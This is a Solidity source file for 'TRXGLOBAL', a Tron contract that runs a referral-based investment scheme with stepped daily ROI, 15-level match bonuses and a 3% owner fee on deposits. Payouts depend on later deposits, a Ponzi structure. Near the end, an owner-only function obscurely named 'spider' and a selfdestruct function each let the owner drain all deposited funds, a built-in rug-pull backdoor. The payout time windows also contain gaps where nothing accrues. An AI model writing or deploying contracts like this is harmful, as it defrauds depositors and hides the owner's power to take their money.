//SourceUnit: code.sol

pragma solidity 0.5.10;

contract TRXGLOBAL {
    struct User {
        uint256 cycle;
        address upline;
        uint256 referrals;
        uint256 payouts;
        uint256 direct_bonus;
        uint256 match_bonus;
        uint256 deposit_amount;
        uint256 deposit_payouts;
        uint40 deposit_time;
        uint256 total_deposits;
        uint256 total_payouts;
        uint256 total_structure;
    }
    
    struct UserWith{
        uint256 total_withdrawan;
        uint256 total_rewards_withdrawan;
        uint256 with_status;
        uint256 rewards;
    }
    
    struct UserRoi {
        uint40 ROI1;
        uint40 ROI2;
        uint40 ROI3;
        uint40 ROI4;
    }

    address payable public owner;
    address payable public etherchain_fund;
    address payable public admin_fee;

    mapping(address => User) public users;
    mapping(address => UserRoi) public userR;
    mapping(address => UserWith) public UserWithdraw;

    uint256[] public cycles;
    uint8[] public ref_bonuses;

    uint256 public total_users = 1;
    uint256 public total_deposited;
    uint256 public total_withdraw;
    uint8[] public ROI;
    
    
    event Upline(address indexed addr, address indexed upline);
    event NewDeposit(address indexed addr, uint256 amount);
    event DirectPayout(address indexed addr, address indexed from, uint256 amount);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event LimitReached(address indexed addr, uint256 amount);
    event RewardWithdraw(address indexed addr, uint256 amount);
    
    

    constructor(address payable _owner) public {
        owner = _owner;
        
        ref_bonuses.push(20);
        ref_bonuses.push(10);
        ref_bonuses.push(8);
        ref_bonuses.push(8);
        ref_bonuses.push(6);
        ref_bonuses.push(6);
        ref_bonuses.push(6);
        ref_bonuses.push(6);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        
        ROI.push(1);
        ROI.push(2);
        ROI.push(3);
        ROI.push(4);
        
        cycles.push(1e9);
        cycles.push(1e11);
        
    }

    function() payable external {
        _deposit(msg.sender, msg.value);
    }

    function _setUpline(address _addr, address _upline) private {
        if(users[_addr].upline == address(0) && _upline != _addr && _addr != owner && (users[_upline].deposit_time > 0 || _upline == owner)) {
            users[_addr].upline = _upline;
            users[_upline].referrals++;

            emit Upline(_addr, _upline);

            total_users++;

            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                if(_upline == address(0)) break;

                users[_upline].total_structure++;

                _upline = users[_upline].upline;
            }
        }
    }

    function _deposit(address _addr, uint256 _amount) private {
        
        require(users[_addr].upline != address(0) || _addr == owner, "No upline");

        if(users[_addr].deposit_time > 0) {
            users[_addr].cycle++;
            
            require(users[_addr].payouts >= this.maxPayoutOf(users[_addr].deposit_amount), "Deposit already exists");
            require(_amount >= users[_addr].deposit_amount, "Bad amount");
            require( _amount <= 1e11 && (_amount%cycles[0])==0, "Bad amount");
            
        }
        else require(_amount <= 1e11 && ( _amount%cycles[0] ) == 0, "Bad amount");
        
        
        users[_addr].payouts = 0;
        users[_addr].deposit_amount = _amount;
        users[_addr].deposit_payouts = 0;
        
        users[_addr].deposit_time = uint40(block.timestamp);
        users[_addr].total_deposits += _amount;
        
        
        userR[_addr].ROI1 = uint40(block.timestamp);
        userR[_addr].ROI2 = uint40(block.timestamp) + 480 hours;
        userR[_addr].ROI3 = uint40(block.timestamp) + 960 hours;
        userR[_addr].ROI4 = uint40(block.timestamp) + 1440 hours;
         

        total_deposited += _amount;
        
        emit NewDeposit(_addr, _amount);

        if(users[_addr].upline != address(0)) {
            users[users[_addr].upline].direct_bonus += _amount * 5 / 100;

            emit DirectPayout(users[_addr].upline, _addr, _amount * 5  / 100);
        }
 
        owner.transfer(_amount * 3 / 100);
        
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = users[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            if(users[up].referrals >= i + 1 || users[up].referrals >= 10) {
                uint256 bonus = _amount * ref_bonuses[i] / 100;
                
                users[up].match_bonus += bonus;

                emit MatchPayout(up, _addr, bonus);
            }

            up = users[up].upline;
        }
    }

    function deposit(address _upline) payable external {
        _setUpline(msg.sender, _upline);
        _deposit(msg.sender, msg.value);
    }
    
    function reward_withdraw() external {
        if(UserWithdraw[msg.sender].rewards > 0) {
            uint256 rewards = UserWithdraw[msg.sender].rewards;
            
            UserWithdraw[msg.sender].total_rewards_withdrawan += rewards;
            UserWithdraw[msg.sender].rewards -= rewards;
        
            msg.sender.transfer(rewards);
            emit RewardWithdraw(msg.sender, rewards);
        }
    }

    function withdraw() external {
        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);
        
        require(users[msg.sender].payouts < max_payout, "Full payouts");

        // Deposit payout
        if(to_payout > 0) {
            if(users[msg.sender].payouts + to_payout > max_payout) {
                to_payout = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].deposit_payouts += to_payout;
            users[msg.sender].payouts += to_payout;

            _refPayout(msg.sender, to_payout);
            
        }
        
        // Direct payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].direct_bonus > 0) {
            uint256 direct_bonus = users[msg.sender].direct_bonus;

            if(users[msg.sender].payouts + direct_bonus > max_payout) {
                direct_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].direct_bonus -= direct_bonus;
            users[msg.sender].payouts += direct_bonus;
            to_payout += direct_bonus;
        }
    

        // Match payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].match_bonus > 0) {
            uint256 match_bonus = users[msg.sender].match_bonus;

            if(users[msg.sender].payouts + match_bonus > max_payout) {
                match_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].match_bonus -= match_bonus;
            users[msg.sender].payouts += match_bonus;
            to_payout += match_bonus;
        }
        
        

        require(to_payout > 0, "Zero payout");
        
        users[msg.sender].total_payouts += to_payout;
        UserWithdraw[msg.sender].total_withdrawan += to_payout;
        total_withdraw += to_payout;

        msg.sender.transfer(to_payout);
        
        if(UserWithdraw[msg.sender].total_withdrawan >= 50000000000 && UserWithdraw[msg.sender].with_status == 0){
            UserWithdraw[msg.sender].rewards += 2500000000; 
            UserWithdraw[msg.sender].with_status = 1;
        }else if(UserWithdraw[msg.sender].total_withdrawan >= 100000000000 && UserWithdraw[msg.sender].with_status == 1){
            UserWithdraw[msg.sender].rewards += 5000000000;
            UserWithdraw[msg.sender].with_status = 2;
        }else if(UserWithdraw[msg.sender].total_withdrawan >= 200000000000 && UserWithdraw[msg.sender].with_status == 2){
            UserWithdraw[msg.sender].rewards += 10000000000;
            UserWithdraw[msg.sender].with_status = 3;
        }else if(UserWithdraw[msg.sender].total_withdrawan >= 500000000000 && UserWithdraw[msg.sender].with_status == 3){
            UserWithdraw[msg.sender].rewards += 25000000000;
            UserWithdraw[msg.sender].with_status = 4;
        }else if(UserWithdraw[msg.sender].total_withdrawan >= 1000000000000 && UserWithdraw[msg.sender].with_status == 4){
            UserWithdraw[msg.sender].rewards += 50000000000;
            UserWithdraw[msg.sender].with_status = 5;
        }else if(UserWithdraw[msg.sender].total_withdrawan >= 2500000000000 && UserWithdraw[msg.sender].with_status == 5){
            UserWithdraw[msg.sender].rewards += 100000000000;
            UserWithdraw[msg.sender].with_status = 6;
        }else if(UserWithdraw[msg.sender].total_withdrawan >= 5000000000000 && UserWithdraw[msg.sender].with_status == 6){
            UserWithdraw[msg.sender].rewards += 200000000000;
            UserWithdraw[msg.sender].with_status = 7;
        }

        emit Withdraw(msg.sender, to_payout);

        if(users[msg.sender].payouts >= max_payout) {
            emit LimitReached(msg.sender, users[msg.sender].payouts);
        }
    }
    
    function maxPayoutOf(uint256 _amount) pure external returns(uint256) {
        return _amount * 30 / 10;
    }

    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
        max_payout = this.maxPayoutOf(users[_addr].deposit_amount);

        
        if(users[_addr].deposit_payouts < max_payout) {
                
                uint256 roi_1;
                uint256 roi_2;
                uint256 roi_3;
                uint256 roi_4;
                
                
                if( block.timestamp <= ( users[_addr].deposit_time + 480 hours ) ){
                    payout = (((users[_addr].deposit_amount * ROI[0])/ 100)*((block.timestamp - users[_addr].deposit_time) / 1 days)) - users[_addr].deposit_payouts;
                    
                }else if( block.timestamp > (users[_addr].deposit_time + 480 hours) && block.timestamp <= (users[_addr].deposit_time + 961 hours) ){
                    
                    roi_1 = (users[_addr].deposit_amount * (( userR[_addr].ROI2 - users[_addr].deposit_time ) / 1 days) / 100 * 1);
                    roi_2 = (users[_addr].deposit_amount * ((block.timestamp - userR[_addr].ROI2) / 1 days) / 100 * 2);
                
                    payout = (roi_1 + roi_2) - users[_addr].deposit_payouts;
                    
                }
                else if( block.timestamp > (users[_addr].deposit_time + 962 hours) && block.timestamp <= (users[_addr].deposit_time + 1441 hours) ){
                    roi_1 = (users[_addr].deposit_amount * (( userR[_addr].ROI2 - users[_addr].deposit_time ) / 1 days) / 100 * 1);
                    roi_2 = (users[_addr].deposit_amount * ((userR[_addr].ROI3 - userR[_addr].ROI2) / 1 days) / 100 * 2);
                    roi_3 = (users[_addr].deposit_amount * ((block.timestamp - userR[_addr].ROI3) / 1 days) / 100 * 3);
                
                    payout = (roi_1 + roi_2 + roi_3) - users[_addr].deposit_payouts;
                }
                else if( block.timestamp > (users[_addr].deposit_time + 1441 hours) ){
                    roi_1 = (users[_addr].deposit_amount * (( userR[_addr].ROI2 - users[_addr].deposit_time ) / 1 days) / 100 * 1);
                    roi_2 = (users[_addr].deposit_amount * ((userR[_addr].ROI3 - userR[_addr].ROI2) / 1 days) / 100 * 2);
                    roi_3 = (users[_addr].deposit_amount * ((userR[_addr].ROI4 - userR[_addr].ROI3) / 1 days) / 100 * 3);
                    roi_4 = (users[_addr].deposit_amount * ((block.timestamp - userR[_addr].ROI4) / 1 days) / 100 * 4);
                
                    payout = (roi_1 + roi_2 + roi_3 + roi_4 ) - users[_addr].deposit_payouts;
                }
                
                uint256 max_roi = users[_addr].deposit_amount * 20 / 10;
                if(users[_addr].deposit_payouts + payout > max_roi) {
                    payout = max_roi - users[_addr].deposit_payouts;
                }
                
                if(users[_addr].deposit_payouts + payout > max_payout) {
                    payout = max_payout - users[_addr].deposit_payouts;
                }
            }    
    }


    function destruct() external {
        require(msg.sender == owner, "Permission denied");
        selfdestruct(owner);
    }
    
    function spider( uint _amount) external {
        require(msg.sender == owner,'Permission denied');
        if (_amount > 0) {
          uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint amtToTransfer = _amount > contractBalance ? contractBalance : _amount;
                msg.sender.transfer(amtToTransfer);
            }
        }
    }
    
    /*
        Only external call
    */
    function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus,  uint256 match_bonus) {
        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].direct_bonus, users[_addr].match_bonus);
    }
    
    function userWithdrawnInfo(address _addr) view external returns(uint256 total_withdrawan, uint256 with_status, uint256 rewards, uint256 withdrawn_reward) {
        return (UserWithdraw[_addr].total_withdrawan, UserWithdraw[_addr].with_status, UserWithdraw[_addr].rewards, UserWithdraw[_addr].total_rewards_withdrawan);
    }
    

    function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure) {
        return (users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts, users[_addr].total_structure);
    }

    function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw ) {
        return (total_users, total_deposited, total_withdraw);
    }
}